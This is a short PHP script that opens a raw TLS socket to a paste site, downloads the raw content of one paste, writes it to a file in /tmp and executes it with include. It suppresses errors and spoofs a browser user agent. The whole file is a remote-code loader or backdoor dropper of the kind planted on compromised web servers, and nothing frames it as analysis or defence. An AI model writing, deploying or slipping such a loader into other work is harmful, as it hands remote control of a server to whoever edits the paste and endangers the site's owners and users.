
<?php
$host = 'pastefy.app';
$port = 443;
$path = '/cYq0t7DZ/raw';

$fp = @fsockopen("ssl://$host", $port, $errno, $errstr, 30);
if (!$fp) exit;

$request = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
fwrite($fp, $request);

$response = '';
while (!feof($fp)) $response .= fread($fp, 8192);
fclose($fp);

$pos = strpos($response, "\r\n\r\n");
if ($pos !== false) {
    $body = substr($response, $pos + 4);
    if (!empty($body)) {
        $tmpfile = '/tmp/pepek1';
        file_put_contents($tmpfile, $body);
        include $tmpfile;
        // unlink($tmpfile); // Hapus kalau mau
    }
}
?>